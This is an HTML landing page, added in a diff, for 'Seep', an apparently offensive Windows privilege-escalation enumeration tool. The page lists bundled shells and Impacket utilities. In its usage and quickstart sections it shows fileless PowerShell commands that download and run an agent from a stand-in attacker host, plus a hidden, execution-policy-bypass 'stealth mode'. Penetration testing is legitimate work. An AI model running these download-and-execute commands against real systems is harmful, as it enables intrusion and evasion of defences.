+        <div class="catalog-count" style="color:var(--ctp-mauve);">17</div>
+        <div class="catalog-info">
+          <h3>Impacket</h3>
+          <p>secretsdump, psexec, wmiexec, ntlmrelayx</p>
+        </div>
+      </div>
+      <div class="catalog-card">
+        <div class="catalog-count" style="color:var(--ctp-flamingo);">15</div>
+        <div class="catalog-info">
+          <h3>Shells</h3>
+          <p>Nishang, PHP shells, netcat variants</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ ARCHITECTURE ============ -->
+  <section id="architecture">
+    <span class="section-label">// architecture</span>
+    <h2 class="section-title">Two components. Zero bloat.</h2>
+    <p class="section-desc">
+      A Python CLI on the attack box orchestrates everything. A composed PowerShell agent runs on the target and reports back.
+    </p>
+
+    <div class="arch-terminal">
+      <div class="arch-titlebar">
+        <span class="hero-dot hero-dot--red"></span>
+        <span class="hero-dot hero-dot--yellow"></span>
+        <span class="hero-dot hero-dot--green"></span>
+        <span class="arch-titlebar-text">system architecture</span>
+      </div>
+      <div class="arch-body">
+        <div class="arch-grid">
+          <div class="arch-item">
+            <div class="arch-item-header">
+              <span class="arch-item-marker">01</span>
+              <h3>Agent Composer</h3>
+            </div>
+            <p>
+              Assembles 16 independent PowerShell modules into a single <code>.ps1</code> agent. Select checks with <code>--checks</code>, apply obfuscation with <code>--obfuscate</code>, strip comments for stealth.
+            </p>
+          </div>
+
+          <div class="arch-item">
+            <div class="arch-item-header">
+              <span class="arch-item-marker">02</span>
+              <h3>HTTP Server</h3>
+            </div>
+            <p>
+              Stdlib <code>http.server</code> &mdash; no Flask, no FastAPI. Serves the agent on GET, receives compressed results on POST. Optional self-signed TLS with path confinement.
+            </p>
+          </div>
+
+          <div class="arch-item">
+            <div class="arch-item-header">
+              <span class="arch-item-marker">03</span>
+              <h3>Results Parser</h3>
+            </div>
+            <p>
+              Accepts JSON, ZIP, and GZip uploads. 50MB upload limit, 200MB decompression limit. Schema validation, decompression bomb protection, and path traversal guards.
+            </p>
+          </div>
+
+          <div class="arch-item">
+            <div class="arch-item-header">
+              <span class="arch-item-marker">04</span>
+              <h3>Report Engine</h3>
+            </div>
+            <p>
+              Recommendation engine maps findings to MITRE ATT&CK techniques. Generates self-contained HTML, Markdown, and JSON reports. Zero external dependencies in output.
+            </p>
+          </div>
+        </div>
+
+        <hr class="arch-divider">
+
+        <div class="arch-stack">
+          <span>Python 3.9+</span>
+          <span>PowerShell 3.0+</span>
+          <span>argparse</span>
+          <span>http.server</span>
+          <span>pyyaml</span>
+          <span>ThreadPoolExecutor</span>
+          <span>OpenSSL</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ USAGE ============ -->
+  <section id="usage">
+    <span class="section-label">// examples</span>
+    <h2 class="section-title">Serve. Execute. Report.</h2>
+    <p class="section-desc">
+      Initialize a workspace, serve the agent, execute on target, generate reports. The CLI handles everything.
+    </p>
+
+    <div class="usage-grid">
+      <div class="usage-card">
+        <div class="usage-card-header">Fileless Execution</div>
+        <div class="usage-card-body">
+          <div class="start-line"><span class="prompt">PS&gt;</span> <span class="cmd">IEX</span><span class="arg">(New-Object Net.WebClient)</span><span class="cmd">.DownloadString(</span><span class="arg">'http://KALI/agent.ps1'</span><span class="cmd">)</span></div>
+          <div class="start-line"><span class="prompt">PS&gt;</span> <span class="cmd">Invoke-Seep</span></div>
+        </div>
+      </div>
+      <div class="usage-card">
+        <div class="usage-card-header">Custom Agent</div>
+        <div class="usage-card-body">
+          <div class="start-line"><span class="prompt">$</span> <span class="cmd">seep compose</span> <span class="flag">--checks</span> <span class="arg">system_info,user_privileges,services</span></div>
+          <div class="start-line"><span class="prompt">$</span> <span class="cmd">seep compose</span> <span class="flag">--obfuscate</span> <span class="flag">-o</span> <span class="arg">agent.ps1</span></div>
+        </div>
+      </div>
+      <div class="usage-card">
+        <div class="usage-card-header">Generate Report</div>
+        <div class="usage-card-body">
+          <div class="start-line"><span class="prompt">$</span> <span class="cmd">seep report</span> <span class="arg">results.json</span> <span class="flag">--format</span> <span class="arg">html</span> <span class="flag">-o</span> <span class="arg">report.html</span></div>
+        </div>
+      </div>
+      <div class="usage-card">
+        <div class="usage-card-header">Tool Management</div>
+        <div class="usage-card-body">
+          <div class="start-line"><span class="prompt">$</span> <span class="cmd">seep catalog download</span> <span class="flag">--all</span> <span class="flag">-w</span> <span class="arg">/tmp/op1</span></div>
+          <div class="start-line"><span class="prompt">$</span> <span class="cmd">seep catalog verify</span> <span class="flag">-w</span> <span class="arg">/tmp/op1</span></div>
+        </div>
+      </div>
+      <div class="usage-card">
+        <div class="usage-card-header">Stealth Mode</div>
+        <div class="usage-card-body">
+          <div class="start-line"><span class="prompt">PS&gt;</span> <span class="cmd">powershell</span> <span class="flag">-ep bypass -NoP -W Hidden</span> <span class="flag">-c</span> <span class="arg">"IEX(...); Invoke-Seep"</span></div>
+        </div>
+      </div>
+      <div class="usage-card">
+        <div class="usage-card-header">TLS Server</div>
+        <div class="usage-card-body">
+          <div class="start-line"><span class="prompt">$</span> <span class="cmd">seep serve</span> <span class="flag">--tls</span> <span class="flag">-w</span> <span class="arg">/tmp/op1</span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ GETTING STARTED ============ -->
+  <section id="getting-started">
+    <span class="section-label">// quickstart</span>
+    <h2 class="section-title">Running in 60 seconds</h2>
+    <p class="section-desc">
+      Install, initialize, serve, execute. One pip install and you're ready for enumeration.
+    </p>
+
+    <div class="start-row">
+      <div class="start-terminal">
+        <div class="start-titlebar">
+          <span class="hero-dot hero-dot--red"></span>
+          <span class="hero-dot hero-dot--yellow"></span>
+          <span class="hero-dot hero-dot--green"></span>
+          <span class="start-titlebar-text">bash</span>
+        </div>
+        <div class="start-body">
+          <div class="start-line">
+            <span class="comment"># Install via pipx (recommended)</span>
+          </div>
+          <div class="start-line" style="margin-bottom:16px;">
+            <span class="prompt">$</span> <span class="cmd">pipx install</span> <span class="arg">git+https://github.com/Real-Fruit-Snacks/Seep.git</span>
+          </div>
+          <div class="start-line">
+            <span class="comment"># Initialize &amp; serve</span>
+          </div>
+          <div class="start-line">
+            <span class="prompt">$</span> <span class="cmd">seep init</span> <span class="flag">-w</span> <span class="arg">/tmp/op1</span>
+          </div>
+          <div class="start-line" style="margin-bottom:16px;">
+            <span class="prompt">$</span> <span class="cmd">seep serve</span> <span class="flag">-w</span> <span class="arg">/tmp/op1</span>
+          </div>
+          <div class="start-line">
+            <span class="comment"># On target (fileless)</span>
+          </div>
+          <div class="start-line" style="margin-bottom:16px;">
+            <span class="prompt">PS&gt;</span> <span class="cmd">IEX</span><span class="arg">(...)</span><span class="cmd">; Invoke-Seep</span>
+          </div>
+          <div class="start-line">
+            <span class="comment"># Generate report</span>
+          </div>
+          <div class="start-line">
+            <span class="prompt">$</span> <span class="cmd">seep report</span> <span class="arg">/tmp/op1/results/*.json</span> <span class="flag">-o</span> <span class="arg">report.html</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="start-info">
+        <p>
+          <strong style="color:var(--ctp-text);">pipx install</strong> installs Seep in an isolated environment and makes the <code>seep</code> CLI available globally. Install from GitHub or a local clone.
+        </p>
+        <p>
+          <strong style="color:var(--ctp-text);">seep init</strong> creates the workspace directory structure &mdash; config, results directory, and tool storage. Everything is isolated per engagement.
+        </p>
+        <p>
+          <strong style="color:var(--ctp-text);">seep serve</strong> starts an HTTP server that delivers the agent on <code>GET /agent.ps1</code> and receives compressed results on <code>POST /upload</code>. Add <code>--tls</code> for HTTPS.
+        </p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ FOOTER ============ -->
+  <footer class="site-footer">
+    <p class="footer-tagline">Enumerate. Analyze. Recommend. Escalate.</p>
+    <nav class="footer-links" aria-label="Footer links">
+      <a href="https://github.com/Real-Fruit-Snacks/Seep">GitHub</a>
+      <a href="https://github.com/Real-Fruit-Snacks/Seep/blob/main/LICENSE">License (MIT)</a>
+      <a href="https://github.com/Real-Fruit-Snacks/Seep/issues">Report Issue</a>
+    </nav>
+    <p class="footer-copy">Seep -- water finds every crack</p>
+  </footer>
+
+</div>
+
+</body>
+</html>
